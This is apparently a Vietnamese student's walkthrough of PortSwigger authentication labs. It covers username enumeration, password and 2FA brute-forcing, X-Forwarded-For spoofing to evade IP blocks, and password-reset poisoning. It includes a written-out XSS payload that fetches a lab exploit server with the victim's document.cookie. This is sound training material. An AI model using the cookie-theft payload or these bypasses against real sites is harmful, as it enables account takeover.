# Lab: Username enumeration via different responses
> Lab: Liệt kê tên người dùng thông qua các phản hồi khác nhau  

This lab is vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:
> Lab này dễ bị tấn công bởi liệt kê tên người dùng và tấn công brute-force mật khẩu. Nó có một tài khoản với tên người dùng và mật khẩu dễ đoán, có thể tìm thấy trong các danh sách từ sau:

- Candidate usernames: danh sách tên người dùng 
- Candidate passwords: danh sách mật khẩu 

To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.
> Để giải quyết bài lab, hãy liệt kê một tên người dùng hợp lệ, tấn công brute-force mật khẩu của người dùng này, sau đó truy cập trang tài khoản của họ. 

![alt text](img/3.png)

Em intercept request với endpoint /login với tài khoản và mật khẩu là luongvd.

Ở đây bài cho chúng ta 2 danh sách, một danh sách tài khoản và một danh sách mật khẩu. Dựa vào các kiến thức về status code, error message và response time e sẽ sử dụng Intruder để tấn công dần từ kiến thức để tìm ra username hợp lệ, rồi từ username hợp lệ sẽ tìm ra password hợp lệ.

![alt text](img/4.png)

Khi cho gói tin đi qua chúng ta thấy được phản hồi của server trả về username không hợp lệ. 

![alt text](img/5.png)

Thử cho qua tab Intruder để tấn công brute-force với mode là Sniper attack và thêm biến tại username với danh sách tài khoản và mật khẩu đã cho ở trên rồi ấn Start attack. 

![alt text](img/6.png)

Ở đây chúng ta đã thấy được phản hồi khác đi so với trước ở đây đã là mật khẩu không hợp lệ.

=> username sẽ là an.

Tiến hành tương tự thay trường username đã biết là an và password tiếp tục tương tự phần trên.

![alt text](img/7.png)

Như vậy là chúng ta đã tìm được ra mật khẩu thành công của username an là 7777777.

![alt text](img/8.png)

# Lab: Username enumeration via subtly different responses
> Liệt kê tên người dùng thông qua các phản hồi có sự khác biệt nhỏ 

![alt text](img/9.png)

Về phần đề bài vẫn như lab phía trên, nhưng lần này khi chúng ta thử nhập bừa thông tin thì phản hồi về mặt nhìn đã thấy khác. Nó ở dưới dạng 1 thông báo chung chung hơn. 

Tiến hành làm tương tự phần lab bên trên xem có phát hiện gì mới hơn.

![alt text](img/10.png)

Đoạn này thấy có vẻ mọi thứ đều quá giống nhau. E tiến hành tìm cách để filter dữ liệu thử tìm những thứ khác Invalid username or password.

![alt text](img/11.png)

![alt text](img/12.png)

Phát hiện thành công request khác. Như vậy là đây chính là puppet chính là user chúng ta cần tìm. Tiếp tục thử tương tự và tìm được password.

![alt text](img/13.png)

Như kiến thức ở phần trước thấy chiều dài trả về cũng đã khác ngắn hơn khá nhiều so với cái không hợp lệ. Password hợp lệ là qazwsx.

![alt text](img/14.png)

# Lab: Username enumeration via response timing
> Liệt kê tên người dùng thông qua thời gian phản hồi

Đề bài cho thêm dữ liệu thông tin đăng nhập: wiener:peter và một danh sách tài khoản, mật khẩu.

Nhiệm vụ vẫn là tìm tên người dùng và mật khẩu hợp lệ.

![alt text](img/15.png)

Khi thử phương pháp tương tự như trên, thì lần này chúng ta đã có 1 thông báo bị chặn yêu cầu thử lại trong 30 nữa. Qua hint đề bài cũng cho em gợi ý bằng cách sửa header của request. 

Vấn đề khi em tìm kiếm có một trường khá hay là X-Forwarded-For. 

Vậy một request đi trên internet như thế nào ? 
Khi mở một trang web, máy tính của em (client) gửi một HTTP request tới server. Request đó giống như một lá thư: có phần địa chỉ nhận, phần nội dung, và các dòng phụ trợ là header. 

Khi một máy tính kết nối với máu tính khác trên mạng, máy nhạn luôn biết chính xác địa chỉ IP của máy vừa gửi tới nó. Đây là thông tin ở tầng thấp (TCP), máy nhạ đọc được chính từ kết nối, client không giả mạo được. Trong web server giá trị này là remote_addr.

IP của kết nối (remote_addr) là thật, không giả được. Còn header thì client tự viết ra, giả được. Toàn bộ câu chuyện của X-Forwarded-For xoay quanh sự khác biệt này.

Trang web đơn giản thì client nối thẳng tới server, server thấy đúng IP client. Nhưng thực tế các trang lớn không như vậy - chúng đặt một máy trung gian đứng trước server. Máy trung gian này gọi chung là proxy (CDN như Cloudflare, hoặc load balancer để chia tải).

Client -> Proxy -> Server.

Bây giờ nảy sinh vấn đề: client không còn nối thẳng tới server nữa, mà nối tới proxy. Rồi proxy tự tạo một kết nối mới tới server.

![alt text](img/16.png)

Nhìn hình trên: server đọc remote_addr thì ra 5.6.7.8 (IP của proxy), chứ không phải 1.2.3.4. Mọi request từ mọi người dùng đều đi qua proxy trông giống hệt nhau - đều đến từ IP proxy. Server đã mất dấu thật của IP của client.

Vì tầng kết nối (TCP) không mang được IP client qua proxy, người ta giải quyết ở tầng ứng dụng: proxy sẽ tự thêm 1 dòng header vào request để nhãn cho server phân biệt được client.

Dòng header đó tên là X-Forwarded-For. Nó chỉ là một dòng chữ, ví dụ: X-Forwarded-For: 1.2.3.4

Nghĩa là: "Request này ta chuyển tiếp giúp, người gửi gốc là 1.2.3.4." Chữ "For" nghĩa là "thay mặt cho / gửi giùm cho". Server đọc dòng này thì lấy lại được IP client.

Trang lớn thường có nhiều lớp proxy nối tiếp CDN -> Load Balancer -> Web Server. Quy tắc là: mỗi proxy nối thêm vào cuối chuỗi cái IP của bên vừa gửi request đến nó.

Kết quả server nhận được một danh sách ngăn cách bằng dấu phẩy, ví dụ: X-Forwarded-For: 1.2.3.4, 5.6.7.8

Client gốc 1.2.3.4, rồi đi qua proxy 5.6.7.8. Phần trái nhất là client gốc, càng về phải càng gần server. 

Từ đó sinh ra vấn đề, không có quy luật nào ngăn client tự đặt sẵn một dòng X-Forwarded-For giả ngay từ request đầu tiên, trước khi nó chạm tới bất kỳ proxy nào. Từ đó giúp chúng ta lợi dụng, một số người code lỏng lẻo có thể bypass qua được.

Áp dụng vào ngay phần lab này.

![alt text](img/17.png)

Sử dụng tấn công Pitchfork với list username đã cho và password thật dài mục đích là để xem reponse nào chậm hơn thì khả năng đó là username chuẩn. Vì phải tốn thời gian check username rồi mới đến password. 

Như vậy thì username ở đây là ap.

![alt text](img/18.png)

Tương tự chúng ta tìm được password là 654321.

![alt text](img/19.png)

# Lab: Broken brute-force protection, IP block
> Tấn công có bảo vệ brute-force nhưng bị lỗi, bị chặn IP 

Ở bài này người ta cho em một tài khoản login hợp lệ và username cần tìm mật khẩu.

Theo như kiến thức lý thuyết, phần này em thấy bài này sẽ block IP nhưng khi chỉ cần login thành công thì lại reset. 

Em sẽ tấn công Pitchfork làm sao để bypass IP qua X-Forwarded-For và cấu hình danh sách payload sao cho cách một tài khoản cần tìm là một tài khoản đúng mà đề cho. Như vậy khi đó thì chúng nó cần xen kẽ nhau là bypass hết thành công.

![alt text](img/20.png)

Cấu hình X-Forwarded-For.

![alt text](img/21.png)

![alt text](img/22.png)

Cấu hình tài khoản và mật khẩu. List danh sách e cấu hình như vậy để đảm bảo xen kẽ.

![alt text](img/23.png)

E chỉ dùng 1 request đồng thời để đảm bảo xen kẽ.

![alt text](img/24.png)

Thành công tìm ra mật khẩu với tài khoản carlos là aaaaaa.

![alt text](img/25.png)

# Lab: Username enumeration via account lock
> Liệt kê người dùng thông qua khóa tài khoản

![alt text](img/26.png)

Em sử dụng tấn công Cluster bomb qua list tài khoản và mật khẩu. Theo như e theo dõi. Chỉ có username academico là phản hồi và bị khóa. Chứng tỏ đây là user thật.

![alt text](img/27.png)

Sau đó e thử cách bypass dúng X-Forwarded-For. Sau khi thử e thấy có maggie là hợp lệ.

E thử với tài khoản và mật khẩu như trên và đã giải được bài lab.

# Lab: Broken brute-force protection, multiple credentials per request
> Tấn công brute-force bị lỗi, nhiều thông tin đăng nhập cho 1 yêu cầu.

![alt text](img/28.png)

Đề bài cho tên người dùng và danh sách mật khẩu. Em đã thử những cách trước đó nhưng không được. Tham khảo https://www.linkedin.com/posts/niraj-patidar-57aa18250_lab-broken-brute-force-protection-multiple-activity-7354106868404781056-5GG-/ em thấy được. Một số hệ thống backend code lỏng lẻo. 

Vì thông tin gửi đi dưới dạng boby data, nên một số hệ thống chỉ check trường password bên trong có chứa password hợp lệ hay không 

![alt text](img/29.png)

Em tiến hành truyền list password vào thành công chiếm được tài khoản.

# Lab: 2FA simple bypass
> Bypass 2FA đơn giản

![alt text](img/30.png)

Ở bài này khá đơn giản e tiến hành login và đến endpoint /login2 này e xóa đi và truy cập lại My account.

![alt text](img/31.png)

Thành công giải xong bài này.

# Lab: 2FA broken logic
> Phá vỡ logic 2FA  

![alt text](img/32.png)

Sau khi login xong chuyển đến trang login2 thì e thấy là đoạn này nó làm việc set cookie theo username và session, tiếp đó là xác minh mã 2fa được nhập vào gửi lên.

E tiến hành chuyển vào Intruder thay thế username cần tìm và brute-force mã code từ 0000-9999

![alt text](img/33.png)

![alt text](img/34.png)

E đã thành công lấy được tài khoản carlos với mã 2fa tìm được.

# Lab: 2FA bypass using a brute-force attack

![alt text](img/35.png)

Quy trình như sau khi từ trang get /login có csrf ở trang web, sau đó post /login dùng csrf để login. Tiếp đó ở trang /login2 cũng tương tự như vậy. Em đã thử thì nhập tối đa 2 lần mã otp sai là sẽ bị logout ra khỏi tài khoản.

![alt text](img/36.png)

Tiến hành cấu hình macro để cho mục đích brute-force.

![alt text](img/37.png)

Tiến hành tấn công brute-force tấn công ở /login2 mới mã 2fa từ 0000 đến 9999. Sau một lúc chạy e đã thu được 2fa hợp lệ.

# Lab: Brute-forcing a stay-logged-in cookie
> Tấn công cookie duy trì đăng nhập

![alt text](img/38.png)

Ở đây e thấy sau khi login xong ấn tick vào duy trì đăng nhập thì phần cookie có giá trị như kia. Sau một hồi kiểm tra e biết đó là tên người dùng : mật khẩu mã hóa md5 rồi base64 lại. 

E chuyển đến tab Intruder và viết 1 script python để gen ra hết payload hợp lệ với user carlos cần tìm và list mật khẩu được cho từ trước.

[Gen_Pass](script/genPass.py)

![alt text](img/39.png)

Như vậy là em đã hoàn thành bài lab này.

# Lab: Offline password cracking
> Crack mật khẩu ngoại tuyến    

Ở bài này đề bài cho em biết được là comment của bài viết bị lỗi XSS. Nhờ XSS này khai thác để lấy cookie. Rồi từ cookie sẽ suy ra được mật khẩu vì mật khẩu phổ biến.

E tiến hành chèn payload <script>fetch('https://exploit-0a680014046f5cb5806e021a012300db.exploit-server.net/exploit'+document.cookie)</script> vào comment của bài viết.

![alt text](img/40.png)

![alt text](img/41.png)

Từ đó e dễ dàng tìm được lại mật khẩu của người dùng cần tìm.

![alt text](img/42.png)

![alt text](img/43.png)

![alt text](img/44.png).

# Lab: Password reset broken logic
> Đổi password bị lỗi logic

Đề bài cho chúng ta 1 tài khoản hợp lệ và 1 user cần tìm mật khẩu.

![alt text](img/45.png)

Em ấn tìm lại mật khẩu của tài khoản đã được cho

![alt text](img/46.png)

Sau đó e tiến hành truy cập vào link đổi mật khẩu

![alt text](img/47.png)

Sau đó e nhập mật khẩu và intercept gói tin. Rõ ràng ở đây chúng ta chỉ cần đổi username cần tìm vì server đang bị lỗi không check lại xem có hợp lệ với người dùng nào mà cứ thay vào là ăn.

![alt text](img/48.png)

E sẽ đổi carlos vô là và như vậy e đăng nhập lại và giải xong bài lab. 

![alt text](img/49.png)

# Lab: Password reset poisoning via middleware
> Lỗi đặt lại mật khẩu thông qua phần mềm trung gian 

Theo đề bài mô tả thì chúng ta sẽ cần khai thác sao cho email reset mật khẩu được gửi nhầm đến server exploit của chúng ta. Về lỗi này sẽ khai thác bằng cách thêm   X-Forwarded-Host vào gói tin gửi email đi, giúp gửi đến sever exploit của chúng ta.

E ấn quên mật khẩu và thêm X-Forwarded-Host đến server exploit

![alt text](img/50.png)

![alt text](img/51.png)

Check lại email cuar wiener thì sẽ nhận đường link đến exploit server.

Với lỗ hổng như thế e sẽ tận dùng để gửi link reset pass và truyền user carlos vô.

![alt text](img/52.png)

![alt text](img/53.png)

Xem lại log trên exploit server e thu được temp-forgot-password-token của carlos.

![alt text](img/54.png)

E truy cập đổi pass thành công giải xong bài lab.

# Lab: Password brute-force via password change
> Tấn công vét cạn mật khẩu thông qua việc thay đổi mật khẩu

E tiến hành login vô tài khoản wiener được cấp. Đề bài có đề cập đến chức năng đổi mật khẩu bị lỗi. 

Tuy nhiên nếu 2 lần mật khẩu xác thực không giống nhau. Thì sẽ ra phản hồi. 

![alt text](img/55.png)

Còn nếu mật khẩu hiện tại không đúng thì sẽ có phản hồi.

![alt text](img/56.png)

Dựa vào 2 phản hồi này e sẽ tấn công để tìm password carlos hợp lệ qua Intruder.

![alt text](img/57.png)

![alt text](img/58.png)

E thu được request hợp lệ và mật khẩu của carlos là joshua

![alt text](img/59.png)